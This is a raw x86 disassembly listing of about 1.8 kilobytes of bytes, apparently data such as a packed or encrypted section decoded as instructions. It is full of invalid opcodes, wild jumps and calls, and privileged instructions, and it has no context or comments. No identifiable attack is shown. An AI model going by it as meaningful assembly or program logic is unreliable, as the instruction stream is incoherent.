  40c496:	popf   
  40c497:	mov    ebp,0x7da501f3
  40c49c:	hlt    
  40c49d:	data16 fbstp TBYTE PTR [edi]
  40c4a0:	push   eax
  40c4a1:	push   esi
  40c4a2:	or     DWORD PTR [ebx+edi*1+0x2b1cb44e],ebx
  40c4a9:	pop    edi
  40c4aa:	xchg   ebp,eax
  40c4ab:	jmp    0x9589eeb3
  40c4b0:	dec    BYTE PTR [ecx-0x78]
  40c4b3:	call   0x5ae1f5bb
  40c4b8:	retf   
  40c4b9:	jno    0x40c4c4
  40c4bb:	imul   BYTE PTR [ebp+0x67c6212e]
  40c4c1:	push   ss
  40c4c2:	cmp    DWORD PTR cs:[ebx+0x30647be1],ecx
  40c4c9:	add    dh,bh
  40c4cb:	sub    eax,0x2160d4d6
  40c4d0:	mul    BYTE PTR [edi-0xa]
  40c4d3:	sub    eax,0x35e18170
  40c4d8:	mov    esi,0x809bd937
  40c4dd:	aaa    
  40c4de:	fisub  WORD PTR [edx-0x2c895418]
  40c4e4:	daa    
  40c4e5:	add    al,0xce
  40c4e7:	jae    0x40c482
  40c4e9:	das    
  40c4ea:	(bad)  
  40c4eb:	sub    eax,0x212ab196
  40c4f0:	sbb    DWORD PTR [ebx-0x4a],ebp
  40c4f3:	sub    eax,0x35958170
  40c4f8:	jle    0x40c531
  40c4fa:	sbb    ecx,DWORD PTR [ecx]
  40c4fc:	add    DWORD PTR [ebp+0x36e8c7f8],ebp
  40c502:	fdivr  QWORD PTR [eax]
  40c504:	pop    esi
  40c505:	aaa    
  40c506:	mov    gs,WORD PTR ds:0xd39907d4
  40c50c:	xor    DWORD PTR [edi],0x24647f7e
  40c512:	jle    0x40c541
  40c514:	inc    esi
  40c515:	stos   BYTE PTR es:[edi],al
  40c516:	outs   dx,BYTE PTR ds:[esi]
  40c517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c518:	cwde   
  40c519:	fyl2x  
  40c51b:	or     BYTE PTR [eax],al
  40c51d:	ss loopne 0x40c558
  40c520:	imul   DWORD PTR [esi]
  40c522:	push   ds
  40c523:	cs jne 0x40c51b
  40c526:	sbb    dh,bl
  40c528:	stos   BYTE PTR es:[edi],al
  40c529:	push   ds
  40c52a:	(bad)  
  40c52b:	jg     0x40c4b2
  40c52d:	add    eax,0xff2e0e00
  40c532:	xor    DWORD PTR [edx],0xffffffa1
  40c535:	push   esi
  40c536:	mov    ds:0x34fe2cf5,eax
  40c53b:	pop    ebp
  40c53c:	xor    al,0xff
  40c53e:	mul    BYTE PTR [edi-0x4a]
  40c541:	or     eax,DWORD PTR [ecx]
  40c543:	ds pusha 
  40c545:	jmp    esi
  40c547:	mov    ebp,0x3fd6e886
  40c54c:	sub    al,0x6a
  40c54e:	jmp    0x289a7d1d
  40c553:	sub    eax,0x1fb9b52c
  40c558:	sub    al,0xff
  40c55a:	mov    esi,0xede800a1
  40c55f:	dec    ebx
  40c560:	sub    al,0xff
  40c562:	pusha  
  40c563:	mov    cl,0x4d
  40c565:	mul    DWORD PTR [esi-0x7a4277f9]
  40c56b:	pop    ss
  40c56c:	sub    al,0xff
  40c56e:	jmp    0x4cc3c6f4
  40c573:	adc    dh,BYTE PTR [edi+edi*8]
  40c576:	xchg   BYTE PTR [edx],dh
  40c578:	mov    ch,0x64
  40c57a:	push   0x29
  40c57c:	sbb    eax,0x96776f7
  40c581:	je     0x40c590
  40c583:	mov    dl,0x6e
  40c585:	call   0x6d0ce8
  40c58a:	aad    0x63
  40c58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c58d:	(bad)  
  40c58e:	call   0xd54030ea
  40c593:	add    BYTE PTR [edx],ch
  40c595:	and    DWORD PTR [esi+0x0],esp
  40c598:	mov    esp,0xddfffef3
  40c59d:	jecxz  0x40c595
  40c59f:	jmp    DWORD PTR [edi]
  40c5a1:	repz je 0x40c5ac
  40c5a4:	lock mov cl,0xa3
  40c5a7:	call   DWORD PTR [edi]
  40c5a9:	repz mov ah,0xe8
  40c5ac:	pop    ds
  40c5ad:	repz (bad) 
  40c5af:	call   FWORD PTR [ebp-0x13531800]
  40c5b5:	repnz (bad) 
  40c5b7:	jmp    FWORD PTR [ebp+0xc]
  40c5ba:	idiv   edi
  40c5bc:	daa    
  40c5bd:	div    BYTE PTR [eax+ecx*1+0x30]
  40c5c1:	xchg   esi,eax
  40c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5c3:	inc    DWORD PTR [edi]
  40c5c5:	div    BYTE PTR [eax+eiz*8-0x10a11]
  40c5cc:	pop    ebp
  40c5cd:	std    
  40c5ce:	out    0x90,eax
  40c5d0:	lods   al,BYTE PTR ds:[esi]
  40c5d1:	cmc    
  40c5d2:	(bad)  
  40c5d3:	call   FWORD PTR [ebp-0x8000930]
  40c5d9:	cmc    
  40c5da:	je     0x40c5e4
  40c5dc:	add    BYTE PTR [edi-0xa58005c],al
  40c5e2:	mov    ah,0xe4
  40c5e4:	lahf   
  40c5e5:	cmc    
  40c5e6:	(bad)  
  40c5e7:	call   0x3f9428
  40c5ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ed:	fcomip st,st(7)
  40c5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f1:	cmc    
  40c5f2:	out    0x59,eax
  40c5f4:	outs   dx,DWORD PTR ds:[esi]
  40c5f5:	idiv   dh
  40c5f7:	inc    DWORD PTR [eax]
  40c5f9:	ins    DWORD PTR es:[edi],dx
  40c5fa:	loope  0x40c5f2
  40c5fc:	jmp    DWORD PTR [edi]
  40c5fe:	fisttp QWORD PTR [ebp-0x59]
  40c601:	daa    
  40c602:	idiv   dh
  40c604:	mov    ch,0xb0
  40c606:	(bad)  
  40c608:	jmp    eax
  40c60a:	dec    ecx
  40c60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60c:	jmp    edi
  40c60e:	cmc    
  40c60f:	mov    ah,0xdc
  40c611:	xor    ebx,ecx
  40c613:	xor    al,0xff
  40c615:	mov    DWORD PTR [ecx],ebx
  40c617:	pop    ebp
  40c618:	jmp    FWORD PTR [esi-0x3e]
  40c61b:	outs   dx,BYTE PTR ds:[esi]
  40c61c:	lock pop esi
  40c61e:	jmp    0x7534:0x25e4ff34
  40c625:	sub    edx,ecx
  40c627:	idiv   ch
  40c629:	dec    esi
  40c62a:	loop   0x40c660
  40c62c:	mov    ch,0x41
  40c62e:	adc    dh,BYTE PTR ds:0x5c3549ff
  40c634:	push   DWORD PTR [esi]
  40c636:	cli    
  40c637:	mov    esi,0x359218f7
  40c63c:	jmp    DWORD PTR [esi]
  40c63e:	sub    al,0xae
  40c640:	sti    
  40c641:	or     DWORD PTR [ecx-0x70],edi
  40c644:	add    BYTE PTR [ecx],dh
  40c646:	jmp    0xed71d28c
  40c64b:	mov    ah,ch
  40c64d:	mov    dl,0x64
  40c64f:	aaa    
  40c650:	push   0x31
  40c652:	(bad)  
  40c653:	or     eax,0x2b287cff
  40c658:	cs xchg ebp,eax
  40c65a:	inc    ebx
  40c65b:	xor    al,0x89
  40c65d:	add    BYTE PTR [esp+ebp*2-0x55],ch
  40c661:	jl     0x40c6de
  40c663:	loope  0x40c668
  40c665:	push   0x80032033
  40c66a:	into   
  40c66b:	or     eax,0x8dbee80c
  40c670:	xor    al,0xff
  40c672:	dec    ecx
  40c673:	adc    eax,0x7b3140da
  40c678:	out    dx,al
  40c679:	mov    ch,0xf9
  40c67b:	loopne 0x40c680
  40c67d:	call   FWORD PTR [eax+edi*1]
  40c680:	sub    esp,esp
  40c682:	pushf  
  40c683:	mov    bl,0x33
  40c685:	call   FWORD PTR [esp+ebx*4]
  40c688:	xor    esi,DWORD PTR [ebp+0x39]
  40c68b:	or     DWORD PTR [ecx-0x3e],edx
  40c68e:	shr    BYTE PTR [edx],cl
  40c690:	pop    esi
  40c691:	dec    edx
  40c692:	jae    0x40c699
  40c694:	jmp    0x685e7267
  40c699:	aas    
  40c69a:	lea    esi,[edx]
  40c69c:	inc    esi
  40c69d:	xor    al,0xb4
  40c69f:	les    edi,FWORD PTR [ebx+edx*8]
  40c6a2:	pop    edi
  40c6a3:	mov    ah,0xd8
  40c6a5:	xor    al,0xdc
  40c6a7:	cld    
  40c6a8:	inc    eax
  40c6a9:	pop    edx
  40c6aa:	mov    ds:0x7108e909,eax
  40c6af:	cli    
  40c6b0:	arpl   WORD PTR [ebp+0x30],si
  40c6b3:	or     ecx,ebp
  40c6b5:	cmp    al,0xec
  40c6b7:	xor    cl,ch
  40c6b9:	add    esi,DWORD PTR [ecx]
  40c6bb:	or     DWORD PTR [esi],ebp
  40c6bd:	mov    esi,0x3e62a22
  40c6c2:	add    BYTE PTR [ecx],dh
  40c6c4:	lahf   
  40c6c5:	call   0xe8e0dd73
  40c6ca:	test   eax,0x382c7d0e
  40c6cf:	popa   
  40c6d0:	jl     0x40c736
  40c6d2:	cmp    BYTE PTR [esi],al
  40c6d4:	sub    dl,dh
  40c6d6:	aam    0xf7
  40c6d8:	mov    bl,0xd0
  40c6da:	xor    esp,DWORD PTR [ebp+ebp*1-0x2f]
  40c6de:	pop    edi
  40c6df:	ret    
  40c6e0:	or     cl,ch
  40c6e2:	(bad)  
  40c6e3:	sahf   
  40c6e4:	mov    ah,0xeb
  40c6e6:	sbb    al,0xb0
  40c6e8:	pop    es
  40c6e9:	jmp    0x31d81ff1
  40c6ee:	vcvtsi2ss xmm2,xmm7,DWORD PTR [esp+edx*1]
  40c6f3:	leave  
  40c6f4:	sub    al,0x40
  40c6f6:	xor    esi,DWORD PTR [esi-0x43ab9e28]
  40c6fc:	cmp    DWORD PTR [ebp+0x3b],0xffffffa6
  40c700:	sub    DWORD PTR [ecx],ebx
  40c702:	(bad)  
  40c703:	xchg   esi,eax
  40c704:	sbb    al,0x0
  40c706:	inc    eax
  40c707:	bound  ebp,QWORD PTR [edx]
  40c709:	mov    DWORD PTR [ebp+eax*2+0x32],esp
  40c70d:	jmp    DWORD PTR [esi+0x25]
  40c710:	(bad)  
  40c711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c712:	pop    esi
  40c713:	inc    edx
  40c714:	lahf   
  40c715:	inc    eax
  40c717:	repnz into 
  40c719:	inc    eax
  40c71a:	jmp    0x3f313b42
  40c71f:	and    ch,BYTE PTR [edx]
  40c721:	push   DWORD PTR [esi+ebx*2+0x804521]
  40c728:	and    ch,BYTE PTR [edx]
  40c72a:	mov    DWORD PTR [ecx+ebx*1+0x32],esp
  40c72e:	jmp    DWORD PTR [esi]
  40c730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c731:	sub    DWORD PTR [edi+0x2d],esp
  40c734:	outs   dx,DWORD PTR ds:[esi]
  40c735:	enter  0x15ff,0xb8
  40c739:	cmp    bh,dh
  40c73b:	push   cs
  40c73c:	bound  ebp,QWORD PTR [eax]
  40c73e:	jne    0x40c735
  40c740:	dec    edx
  40c741:	repz test al,0xfe
  40c744:	arpl   WORD PTR [edx+0x285a0985],dx
  40c74a:	inc    DWORD PTR [ebx+0x43a9b132]
  40c750:	in     al,dx
  40c751:	sub    dh,bh
  40c753:	xchg   esp,eax
  40c754:	inc    edx
  40c755:	and    bh,bh
  40c757:	(bad)  
  40c758:	inc    ebx
  40c759:	sahf   
  40c75a:	or     eax,ecx
  40c75c:	xor    esi,DWORD PTR [edx-0x1]
  40c75f:	(bad)  
  40c760:	gs mov gs,esp
  40c763:	mov    dh,0x23
  40c765:	sub    BYTE PTR [edx-0x17],ch
  40c768:	mov    edx,0x35285a5c
  40c76d:	sub    BYTE PTR [ebp-0xd7f467],dh
  40c773:	sahf   
  40c774:	jns    0x40c78a
  40c776:	call   0xff692218
  40c77b:	pusha  
  40c77c:	mov    ecx,0xaf00f731
  40c781:	fld    TBYTE PTR [ecx+0x0]
  40c784:	inc    eax
  40c785:	(bad)  
  40c786:	pop    ecx
  40c787:	inc    ecx
  40c788:	mov    bl,bl
  40c78a:	mov    ah,0xf0
  40c78c:	add    BYTE PTR [edi],al
  40c78e:	(bad)  
  40c790:	jmp    DWORD PTR [ebp+0x28]
  40c793:	out    0xd9,eax
  40c795:	mov    al,ds:0x589fedb
  40c79a:	fdiv   st,st(6)
  40c79c:	(bad)  
  40c79d:	dec    DWORD PTR [esi-0x24d81b43]
  40c7a3:	inc    BYTE PTR [eax]
  40c7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a6:	and    eax,0xe2e8bd82
  40c7ab:	(bad)  
  40c7ac:	call   FWORD PTR [eax+0x60]
  40c7af:	fs or  ebp,0x7
  40c7b3:	idiv   edi
  40c7b5:	pop    ds
  40c7b6:	or     al,0x74
  40c7b8:	pop    esp
  40c7b9:	retf   
  40c7ba:	cwde   
  40c7bb:	out    0xf7,eax
  40c7bd:	aas    
  40c7be:	(bad)  
  40c7c0:	jae    0x40c78d
  40c7c2:	cmp    edi,0xffffffff
  40c7c5:	das    
  40c7c6:	call   0xa23b:0x41075fe
  40c7cd:	pop    ds
  40c7ce:	(bad)  
  40c7d0:	mov    ch,0xdc
  40c7d2:	loope  0x40c7d2
  40c7d4:	(bad)  
  40c7d5:	fistp  WORD PTR [edi+0x7]
  40c7d8:	call   0x3f776c
  40c7dd:	call   FWORD PTR [edi-0x26100819]
  40c7e3:	(bad)  
  40c7e4:	jne    0x40c7c6
  40c7e6:	add    eax,DWORD PTR [ecx-0x126605e]
  40c7ec:	mov    ch,0xf4
  40c7ee:	loope  0x40c7ee
  40c7f0:	inc    DWORD PTR [eax]
  40c7f2:	(bad)  
  40c7f3:	pop    edi
  40c7f4:	pop    es
  40c7f5:	call   0x3f7715
  40c7fa:	xor    DWORD PTR [edi+0x77],edi
  40c7fd:	loopne 0x40c7a5
  40c7ff:	xchg   esi,eax
  40c800:	xor    edi,edi
  40c802:	sbb    al,0x1a
  40c804:	sbb    esp,DWORD PTR [ebp-0x2d]
  40c807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c808:	xor    bh,bh
  40c80a:	fdivr  QWORD PTR [ebp+0x39]
  40c80d:	dec    DWORD PTR [esi-0x66f8494a]
  40c813:	data16 gs (bad) 
  40c816:	jle    0x40c7de
  40c818:	jbe    0x40c7fe
  40c81a:	jle    0x40c7da
  40c81c:	xor    al,ch
  40c81e:	sub    BYTE PTR [ebp-0x5b9900cf],cl
  40c824:	and    esi,edi
  40c826:	pop    esi
  40c827:	out    0x1b,al
  40c829:	cs mov esi,ds
  40c82c:	xor    bh,bh
  40c82e:	test   ch,ah
  40c830:	cmp    bh,bh
  40c832:	inc    esi
  40c833:	stc    
  40c834:	in     al,0xa4
  40c836:	ds push es
  40c838:	xor    DWORD PTR [ebp-0xcef9b7],esi
  40c83e:	sbb    DWORD PTR [ecx],ebx
  40c840:	jmp    WORD PTR [esi]
  40c843:	adc    BYTE PTR [edi-0x24],dh
  40c846:	sub    BYTE PTR es:[eax],dh
  40c849:	call   0xff719d72
  40c84e:	push   cs
  40c84f:	fidiv  WORD PTR [ebx]
  40c851:	test   DWORD PTR [esi],0x753030
  40c857:	sub    eax,0x907b647
  40c85c:	(bad)  
  40c85d:	xor    edi,edi
  40c85f:	out    dx,al
  40c860:	push   edi
  40c861:	jbe    0x40c853
  40c863:	fimul  WORD PTR [edi+0x30]
  40c866:	call   0xff71554b
  40c86b:	(bad)  
  40c86c:	cmc    
  40c86d:	sub    ebp,ecx
  40c86f:	pusha  
  40c870:	jbe    0x40c8a2
  40c872:	inc    esi
  40c874:	or     DWORD PTR [eax+esi*1],ebx
  40c877:	leave  
  40c878:	adc    al,0x78
  40c87a:	add    esi,DWORD PTR [ecx]
  40c87c:	push   eax
  40c87d:	stos   DWORD PTR es:[edi],eax
  40c87e:	jmp    FWORD PTR [esi-0x4de09e43]
  40c884:	dec    ebp
  40c885:	test   DWORD PTR [ebp+0x30d5b09e],ebx
  40c88b:	sbb    al,0x11
  40c88d:	add    DWORD PTR [ebx+edx*8],0xec7a6e26
  40c894:	and    al,0xd1
  40c896:	sub    ebx,ebx
  40c898:	(bad)  
  40c899:	call   0xa1a004ce
  40c89e:	ret    0x276e
  40c8a1:	aam    0xfb
  40c8a3:	dec    esi
  40c8a4:	pop    ds
  40c8a5:	inc    esp
  40c8a6:	xor    BYTE PTR [esi-0x4f],bl
  40c8a9:	inc    esi
  40c8aa:	int    0xf1
  40c8ac:	or     cl,al
  40c8ae:	add    eax,0x30690931
  40c8b3:	mov    esp,0x3c271110
  40c8b8:	es push ds
  40c8ba:	xor    BYTE PTR [eax],al
  40c8bc:	mov    esp,0x36b61624
  40c8c1:	xor    edi,esi
  40c8c3:	gs es xor BYTE PTR es:[ebp+0x35],al
  40c8c9:	or     DWORD PTR [esp+edi*2+0x1f2d8805],edx
  40c8d0:	push   es
  40c8d1:	es out dx,al
  40c8d3:	jge    0x40c941
  40c8d5:	and    eax,0xf9842f39
  40c8da:	fnstsw WORD PTR [ecx-0x6b78ced6]
  40c8e0:	xor    DWORD PTR [ecx],ecx
  40c8e2:	loop   0x40c927
  40c8e4:	mov    WORD PTR ss:[esi+0x4],?
  40c8e8:	xor    DWORD PTR [ecx],ecx
  40c8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8eb:	leave  
  40c8ec:	fimul  WORD PTR [eax]
  40c8ee:	add    cl,ch
  40c8f0:	xor    cl,BYTE PTR [ecx]
  40c8f2:	(bad)  
  40c8f3:	and    al,0x9
  40c8f5:	es pop es
  40c8f7:	jmp    0x13407c2e
  40c8fc:	sub    eax,0x3502ffb3
  40c901:	xchg   esp,eax
  40c902:	inc    ebp
  40c903:	xchg   ebp,eax
  40c904:	jge    0x40c89a
  40c906:	test   DWORD PTR [ebp+0x66],edi
  40c909:	call   FWORD PTR es:[ecx]
  40c90c:	inc    esi
  40c90d:	pushf  
  40c90e:	div    DWORD PTR [esi-0x38]
  40c911:	and    eax,ebp
  40c913:	dec    edi
  40c914:	popf   
  40c915:	or     BYTE PTR [eax],al
  40c917:	repnz repnz pushf 
  40c91a:	add    DWORD PTR [edx+0x58],edx
  40c91d:	xchg   esp,eax
  40c91e:	test   DWORD PTR [ebp+0x0],eax
  40c921:	es es (bad) 
  40c924:	mov    ecx,0x3ef48bb1
  40c929:	push   cs
  40c92a:	es push eax
  40c92c:	ds cwde 
  40c92e:	adc    eax,0x2d4ebcff
  40c933:	inc    ecx
  40c934:	xchg   BYTE PTR [esi],dl
  40c936:	mov    DWORD PTR es:[ebp+eax*1+0x1e],ebp
  40c93b:	call   FWORD PTR [esi]
  40c93d:	cmp    ah,BYTE PTR [ebp+0x74]
  40c940:	retf   
  40c941:	mov    bl,0x66
  40c943:	in     al,dx
  40c944:	push   ss
  40c945:	push   esi
  40c946:	and    al,0x0
  40c948:	jge    0x40c977
  40c94a:	mov    cl,0xff
  40c94c:	call   0x3d402c88
  40c951:	push   ecx
  40c952:	sbb    al,0xff
  40c954:	out    dx,al
  40c955:	push   edi
  40c956:	pop    esi
  40c957:	lock fimul WORD PTR [edi+0x24]
  40c95b:	call   DWORD PTR [ebp+esi*8+0x2c]
  40c95f:	mov    ch,0xa0
  40c961:	pop    ds
  40c962:	and    al,0xff
  40c964:	xchg   esp,eax
  40c965:	and    bl,BYTE PTR [edi+edi*8]
  40c968:	add    bh,dh
  40c96a:	add    dl,dh
  40c96c:	mov    ds:0x45fef397,eax
  40c971:	cmp    bh,0x7f
  40c974:	(bad)  
  40c975:	std    
  40c976:	fsub   st,st(7)
  40c978:	adc    DWORD PTR [eax],edi
  40c97a:	or     BYTE PTR [eax],al
  40c97c:	leave  
  40c97d:	mov    ah,BYTE PTR [edi+edi*8]
  40c980:	push   esp
  40c981:	adc    eax,DWORD PTR [ebx+eax*4]
  40c984:	les    eax,FWORD PTR [eax]
  40c986:	mov    ah,0x82
  40c988:	jmp    FWORD PTR [ecx-0x70]
  40c98b:	repz je 0x40c996
  40c98e:	ror    BYTE PTR [ebx],0xa1
  40c991:	inc    DWORD PTR [edi]
  40c993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c994:	inc    esp
  40c995:	cld    
  40c996:	xor    BYTE PTR [eax],ah
  40c998:	pop    edx
  40c999:	inc    ecx
  40c99a:	mov    bl,dh
  40c99c:	xor    al,0xb6
  40c99e:	ror    BYTE PTR [ebp-0x1],0xfe
  40c9a2:	lea    esp,[eax]
  40c9a4:	out    0x25,eax
  40c9a6:	div    edx
  40c9a8:	(bad)  
  40c9a9:	push   0x404f63
  40c9ae:	or     BYTE PTR [edx],0x0
  40c9b1:	add    al,bl
  40c9b3:	bnd je 0x40c9be
  40c9b6:	lock idiv dh
  40c9b9:	call   DWORD PTR [edi]
  40c9bb:	and    BYTE PTR [ebx],0x5b
  40c9be:	mov    DWORD PTR [eax],ecx
  40c9c0:	push   DWORD PTR ds:0x40608e
  40c9c6:	aaa    
  40c9c7:	popa   
  40c9c8:	pop    es
  40c9c9:	call   0x3fbcd6
  40c9ce:	shr    BYTE PTR [ebx],0x5a
  40c9d1:	inc    ecx
  40c9d2:	sbb    BYTE PTR [eax-0x77e7ffff],al
  40c9d8:	push   DWORD PTR [ebp+0x0]
  40c9db:	add    dh,ch
  40c9dd:	(bad)  
  40c9de:	xlat   BYTE PTR ds:[ebx]
  40c9df:	cmc    
  40c9e0:	(bad)  
  40c9e1:	jne    0x40ca14
  40c9e3:	ds sub eax,0x374a3975
  40c9e9:	mov    al,ds:0x3b4ade00
  40c9ee:	ret    0x322d
  40c9f1:	(bad)  
  40c9f2:	mov    bl,ch
  40c9f4:	pop    edx
  40c9f5:	mov    bh,0xb
  40c9f7:	fnstenv [ecx+0x65]
  40c9fa:	(bad)  
  40c9fb:	mov    esi,0x67744316
  40ca00:	cli    
  40ca01:	into   
  40ca02:	pop    edx
  40ca03:	lock xor ebx,edx
  40ca06:	out    0xf5,eax
  40ca08:	retf   0xff2c
  40ca0b:	add    DWORD PTR [edx],eax
  40ca0d:	aam    0x67
  40ca0f:	xor    DWORD PTR [edx],esi
  40ca11:	sbb    al,0xbe
  40ca13:	sbb    ebx,esi
  40ca15:	enter  0x3140,0x2
  40ca19:	sub    eax,0xf6ba2975
  40ca1e:	retf   
  40ca1f:	jbe    0x40c9e3
  40ca21:	retf   
  40ca22:	xor    BYTE PTR [bp+si],dh
  40ca25:	sbb    al,0xbe
  40ca27:	fld    DWORD PTR [ebp-0x7dcebf38]
  40ca2d:	sub    al,0x75
  40ca2f:	sub    DWORD PTR [edx-0x25b1341e],edi
  40ca35:	retf   
  40ca36:	xor    esi,DWORD PTR [bp+si]
  40ca39:	sbb    al,0xbe
  40ca3b:	leave  
  40ca3c:	pusha  
  40ca3d:	enter  0x3140,0x62
  40ca41:	sub    al,0x75
  40ca43:	cmp    DWORD PTR [eax],ecx
  40ca45:	dec    ebx
  40ca47:	es adc al,0x1c
  40ca4a:	push   ss
  40ca4b:	ror    BYTE PTR [ebx],cl
  40ca4d:	sub    eax,0x18f300c9
  40ca52:	add    edx,DWORD PTR [ebp-0x46]
  40ca55:	or     al,0x81
  40ca57:	les    eax,FWORD PTR ds:0x186a0387
  40ca5d:	or     esi,esp
  40ca5f:	mov    dh,0x2e
  40ca61:	xor    DWORD PTR [ecx],esp
  40ca63:	fs out dx,al
  40ca65:	and    ah,BYTE PTR [eax-0x3a]
  40ca68:	jmp    0xd111:0x642cf2af
  40ca6f:	adc    esi,0x22
  40ca72:	mov    esi,0x3c221399
  40ca77:	cld    
  40ca78:	into   
  40ca79:	fwait
  40ca7a:	lods   eax,DWORD PTR ds:[esi]
  40ca7b:	sub    al,0xbe
  40ca7d:	scas   eax,DWORD PTR es:[edi]
  40ca7e:	add    al,0x2d
  40ca80:	cmp    al,0x11
  40ca82:	xchg   ecx,eax
  40ca83:	lahf   
  40ca84:	scas   eax,DWORD PTR es:[edi]
  40ca85:	and    dl,BYTE PTR [esi-0x71dae3d4]
  40ca8b:	mov    dh,0x36
  40ca8d:	xor    DWORD PTR [ebx],ebx
  40ca8f:	fs xchg esi,eax
  40ca91:	and    dh,BYTE PTR [eax+0x1c093541]
  40ca97:	jns    0x40ca2e
  40ca99:	xchg   BYTE PTR [ebp-0xb6381d1],ah
  40ca9f:	sbb    ebx,DWORD PTR [ebx]
  40caa1:	push   0x5e
  40caa3:	sub    al,0x3a
  40caa5:	dec    ecx
  40caa6:	out    0x87,al
  40caa8:	xchg   edx,eax
  40caa9:	or     ecx,ebp
  40caab:	add    ebp,DWORD PTR [eax-0x2b7fbb34]
  40cab1:	clc    
  40cab2:	call   0x227ccb6e
  40cab7:	mov    esp,0x2c9c4613
  40cabc:	sbb    ebx,DWORD PTR [eax-0x57d3d995]
  40cac2:	int3   
  40cac3:	sbb    al,0x9b
  40cac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac6:	mov    esi,0x9c2603a7
  40cacb:	or     al,0x1b
  40cacd:	imul   eax,DWORD PTR fs:[esi],0x2c
  40cad1:	xor    DWORD PTR [ecx+0x631e03e8],0x9c559900
  40cadb:	pop    es
  40cadc:	add    DWORD PTR [esi+0x15e6ff50],esp
  40cae2:	xchg   DWORD PTR [edx-0x5a4ee522],esp
  40cae8:	xor    ch,ah
  40caea:	and    esi,edi
  40caec:	push   esp
  40caed:	or     DWORD PTR [ecx],esi
  40caef:	adc    al,0x8f
  40caf1:	or     ah,BYTE PTR [edx]
  40caf3:	push   eax
  40caf4:	push   ecx
  40caf5:	xor    al,0x9
  40caf7:	out    dx,eax
  40caf8:	ja     0x40cad7
  40cafa:	and    dh,BYTE PTR [ebp-0x1f]
  40cafd:	sbb    dl,BYTE PTR [esi+0x310aa6c7]
  40cb03:	popa   
  40cb04:	dec    ebx
  40cb05:	pop    edx
  40cb06:	and    ch,BYTE PTR [eax+0x65]
  40cb09:	jbe    0x40cad3
  40cb0b:	dec    DWORD PTR [ebp+0x7ae81de0]
  40cb11:	adc    BYTE PTR [edx],ah
  40cb13:	call   FWORD PTR [ecx]
  40cb15:	lods   eax,DWORD PTR ds:[esi]
  40cb16:	and    edi,edi
  40cb18:	xchg   BYTE PTR [eax],al
  40cb1a:	sbb    edi,DWORD PTR [ecx+0x297af4fe]
  40cb20:	push   edx
  40cb21:	xor    DWORD PTR [edx+0x22],ecx
  40cb24:	call   0xff629fd2
  40cb29:	rcr    ecx,0xbd
  40cb2c:	inc    eax
  40cb2d:	jmp    0x523c673d
  40cb32:	jmp    FWORD PTR [ebx-0x1]
  40cb35:	ds gs test eax,0x632be900
  40cb3c:	push   eax
  40cb3d:	or     BYTE PTR cs:[ecx],0xe8
  40cb41:	fdivr  st,st(2)
  40cb43:	and    edi,edi
  40cb45:	adc    DWORD PTR [edx],edi
  40cb47:	imul   edi,edi,0x16
  40cb4a:	pop    edx
  40cb4b:	xchg   esi,eax
  40cb4c:	sti    
  40cb4d:	add    DWORD PTR [edx+0x6b],eax
  40cb50:	inc    DWORD PTR [eax]
  40cb52:	das    
  40cb53:	faddp  st(1),st
  40cb55:	or     al,0x18
  40cb57:	cmp    cl,BYTE PTR [edx-0x4366414]
  40cb5d:	push   0x8
  40cb5f:	jg     0x40cb7a
  40cb61:	call   DWORD PTR [ebp+0x1d]
  40cb64:	out    0x39,eax
  40cb66:	outs   dx,DWORD PTR ds:[esi]
  40cb67:	repz dec BYTE PTR [ecx+0x69f115]
  40cb6e:	jb     0x40cb7f
  40cb70:	push   DWORD PTR [ebp-0x20]
  40cb73:	add    al,0x22
  40cb75:	dec    DWORD PTR [edi+0x720069f3]
  40cb7b:	sub    dh,bh
  40cb7d:	jne    0x40cb7f
  40cb7f:	rol    BYTE PTR [esi+edx*1],1
  40cb82:	dec    DWORD PTR [edi+0x420069f3]
  40cb88:	adc    edi,edi
  40cb8a:	jne    0x40cb1c
  40cb8c:	add    al,0xa
  40cb8e:	jmp    FWORD PTR [edi+0x53da67f3]
  40cb94:	inc    esi
  40cb95:	jmp    FWORD PTR [ecx-0x6e]
  40cb98:	repz je 0x40cba3
  40cb9b:	mov    al,0xef
  40cb9d:	std    
  40cb9e:	dec    DWORD PTR [edi]
  40cba0:	test   cl,bl
  40cba2:	pop    ebx
  40cba3:	leave  
  40cba4:	or     al,0x6a
  40cba6:	and    ecx,DWORD PTR [edi]
  40cba8:	pop    ecx
  40cba9:	pop    es
  40cbaa:	call   0x3fbd9b
  40cbaf:	jo     0x40cb7f
  40cbb1:	pop    edx
  40cbb2:	inc    ecx
  40cbb3:	dec    eax
  40cbb4:	jle    0x40cbd1
  40cbb6:	inc    DWORD PTR [ebp-0x12218dc]
  40cbbc:	repnz (bad) 
  40cbbe:	inc    DWORD PTR [ebp+0x4075fee8]
  40cbc4:	add    al,0x20
  40cbc6:	lahf   
  40cbc7:	dec    edi
  40cbc8:	repz enter 0x31c2,0x2e
  40cbcd:	add    edx,DWORD PTR [ebp-0x56]
  40cbd0:	sbb    eax,0x1f09c483
  40cbd5:	sub    edi,edi
  40cbd7:	mov    esp,0x6502764
  40cbdc:	popf   
  40cbdd:	adc    bh,bh
  40cbdf:	test   BYTE PTR [esi],bh
  40cbe1:	sbb    edi,DWORD PTR [eax+0x331a400]
  40cbe7:	or     esi,ecx
  40cbe9:	cs jle 0x40cc33
  40cbec:	xor    BYTE PTR [edx],dh
  40cbee:	add    eax,edi
  40cbf0:	je     0x40cc2c
  40cbf2:	add    al,0x0
  40cbf4:	xor    DWORD PTR [edx],esi
  40cbf6:	inc    eax
  40cbf7:	inc    ebp
  40cbf8:	lds    ebx,FWORD PTR [esi+0x1]
  40cbfb:	add    BYTE PTR [ecx],dh
  40cbfd:	int3   
  40cbfe:	add    ebp,DWORD PTR [edx+0x31]
